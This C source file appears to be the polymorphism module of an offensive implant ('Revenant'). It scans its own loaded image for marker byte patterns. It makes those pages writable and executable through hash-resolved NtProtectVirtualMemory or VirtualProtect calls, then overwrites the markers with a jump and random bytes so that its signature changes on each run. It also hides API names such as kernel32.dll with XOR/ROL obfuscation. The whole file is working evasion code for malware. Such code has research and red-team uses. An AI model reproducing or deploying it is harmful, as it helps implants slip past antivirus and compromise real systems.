//
// Created by 0xtriboulet on 4/15/2023.
// Code in Poly.c is messier than other .c files because Poly runs before Init()
//
#include "Dbg.h"
#include "Asm.h"
#include "Defs.h"
#include "Poly.h"
#include "Config.h"
#include "Strings.h"
#include "Revenant.h"
#include "Utilities.h"
#include "Obfuscation.h"

#include <tchar.h>
#include <stdio.h>
#if CONFIG_POLYMORPHIC == TRUE

#if CONFIG_MAKE == 0
INT morphModule() {

    // Get a handle to the base module of the current process.

    HMODULE hModule = GetModuleHandle(NULL);

#elif CONFIG_MAKE == 1
INT morphModule(HINSTANCE hinstDLL) {

    HMODULE hModule = hinstDLL;

#endif
    INT returnValue = 1;

#if CONFIG_OBFUSCATION == TRUE

    UCHAR s_xk[] = S_XK;
    UCHAR s_string[] = S_MARKER_MASK;

    UCHAR MARKER_MASK[50] = {0};

    ROL_AND_DECRYPT((CHAR *)s_string, sizeof(s_string), 1, MARKER_MASK, s_xk);

#else

    // Reserved for future functionality

    UCHAR * MARKER_MASK = "xxxxxxxxxxxxxxxxxxxxxxxx";
#endif

    // Declare the MODULEINFO struct to store module information.
    MODULEINFO modInfo;

    // Obtain the current process handle.
    HANDLE hProcess = NtCurrentProcess;

    // If the module information is obtained successfully, enter the loop.
    if (GetModuleInformation(hProcess, hModule, &modInfo, sizeof(MODULEINFO))){
        // Check if module size is less than MAXDWORD.
        if (modInfo.SizeOfImage < MAXDWORD){

            // Declare the byte pointer to the last matching pattern and the match offset.
            PBYTE pbyLastMatch = 0;
            DWORD dwMatchOffset = 0;

            // Set the morphing status to not finished.
            BOOL bMorphingFinished = FALSE;

            // Declare a counter for the number of memory regions that have been morphed.

            DWORD dwRegionCount = 0;
            UCHAR* marker_bytes = MARKER_BYTES;
            UCHAR markerAddr[MARKER_SIZE] = {0};

            mem_cpy(markerAddr,marker_bytes,MARKER_SIZE);

            // Iterate through memory regions of the current process's module to search for the marker pattern.
            while (!bMorphingFinished){

                // Call the findPattern function to search for the marker pattern in memory.

                PVOID startAddr= (PVOID)modInfo.lpBaseOfDll;

                pbyLastMatch = findPattern(startAddr+ dwMatchOffset, modInfo.SizeOfImage - dwMatchOffset, markerAddr, MARKER_MASK, MARKER_SIZE);

                // If the marker pattern is found, replace it with random opcodes and update the offsets.
                if (pbyLastMatch != NULL){

                    morphMemory(pbyLastMatch, MARKER_SIZE);
                    dwRegionCount++;

                    pbyLastMatch++;
                    dwMatchOffset = (UCHAR*)pbyLastMatch - (UCHAR*)modInfo.lpBaseOfDll;

                }else{
                    // If the marker pattern is not found, set the morphing status to finished.
                    returnValue = 0;
                    bMorphingFinished = TRUE;
                }
            }
        }
    }

    // Clean up the process handle.
    return returnValue;
}


VOID morphMemory(UCHAR* pbyDst, UCHAR byLength){
    static INT bSetSeed = 1;
    if (bSetSeed){
        srand((UINT)time(NULL));
        bSetSeed = 0;
    }

    UCHAR* morphedOpcodes = (UCHAR*)malloc(sizeof(UCHAR) * byLength);
    UCHAR byOpcodeIt = 0;

    INT bPlaceNop = rand() % 2;
    if (bPlaceNop){
        morphedOpcodes[byOpcodeIt] = ASM_OPCODE_NOP;
        byOpcodeIt++;
    }

    morphedOpcodes[byOpcodeIt] = ASM_OPCODE_JMP_REL;
    byOpcodeIt++;

    morphedOpcodes[byOpcodeIt] = byLength - ASM_INSTR_SIZE_JMP_REL - (bPlaceNop ? ASM_INSTR_SIZE_NOP : 0);
    byOpcodeIt++;

    for (; byOpcodeIt < byLength; byOpcodeIt++){
        morphedOpcodes[byOpcodeIt] = rand() % MAXBYTE;
    }

    // Change the protection of the memory to allow execution and write the morphed opcodes to memory
    DWORD dwOldProtect = 0x0;

#if CONFIG_NATIVE == TRUE

#if CONFIG_ARCH == 64
    VOID* p_ntdll = get_ntdll_64();
#else
    void *p_ntdll = get_ntdll_32();
#endif //CONFIG_ARCH

    PBYTE pbyMarker = pbyDst;

    NTSTATUS status;
    NtProtectVirtualMemory_t p_NtProtectVirtualMemory = GetProcAddressByHash(p_ntdll, NtProtectVirtualMemory_CRC32B);
    SIZE_T pbySize = sizeof(MARKER_BYTES);

    // set permissions
    check_debug(p_NtProtectVirtualMemory(NtCurrentProcess,&pbyDst, &pbySize,PAGE_EXECUTE_READWRITE,&dwOldProtect) == 0 , "NtProtectVirtualMemory (RWX) Failed!");

    // patch marker bytes
    mem_cpy((VOID *) pbyMarker,  (CONST VOID *) morphedOpcodes, (size_t) byLength);

    // Restore the original memory protection
    check_debug(p_NtProtectVirtualMemory(NtCurrentProcess, &pbyDst, &pbySize, dwOldProtect, &dwOldProtect) == 0, "NtProtectVirtualMemory (RX) Failed!");

#else

#if CONFIG_OBFUSCATION // obfuscation
    UCHAR s_string[] = S_KERNEL32;
    UCHAR d_string[13] = {0};

    UCHAR s_xk[] = S_XK;

    ROL_AND_DECRYPT((CONST CHAR *)s_string, sizeof(s_string), 1, (CHAR*) d_string, (CONST CHAR *) s_xk);

#else // not obfuscated

    UCHAR d_string[13] = {'k','e','r','n','e','l','3','2','.','d','l','l',0x0};

#endif
    VirtualProtect_t p_VirtualProtect =
            (VirtualProtect_t) GetProcAddressByHash(LocalGetModuleHandle((LPCSTR) d_string), VirtualProtect_CRC32B);

    check_debug(p_VirtualProtect(pbyDst, byLength, PAGE_EXECUTE_READWRITE, &dwOldProtect) != 0, "VirtualProtect (RWX) Failed!");

    mem_cpy((VOID *) pbyDst,  (VOID *) morphedOpcodes, (size_t) byLength);

    // Restore the original memory protection
    check_debug(p_VirtualProtect(pbyDst, byLength, dwOldProtect, &dwOldProtect) != 0, "VirtualProtect (RX) Failed!");

#endif //CONFIG NATIVE
    LEAVE:

    // Free the memory allocated for the morphed opcodes
    if(morphedOpcodes != NULL){

        free(morphedOpcodes);
    }


}


VOID* findPattern(VOID* startAddress, SIZE_T searchSize, CONST VOID* pattern, CONST VOID* mask, SIZE_T patternSize){
    CONST UCHAR* start = (CONST UCHAR*)startAddress;
    CONST UCHAR* patternBytes = (CONST UCHAR*)pattern;
    CONST UCHAR* patternMask = (CONST UCHAR*)mask;

    for (size_t i = 0; i < searchSize - patternSize; i++){
        BOOL found = TRUE;
        for (size_t j = 0; j < patternSize; j++){
            if (patternMask[j] && (start[i + j] != patternBytes[j])){
                found = FALSE;
                break;
            }
        }

        if (found){
            return (VOID*)(start + i);
        }
    }

    return NULL;
}


#else //CONFIG_POLYMORPHIC

INT morphModule()
{

    return 0;
}
#endif //CONFIG_POLYMORPHIC
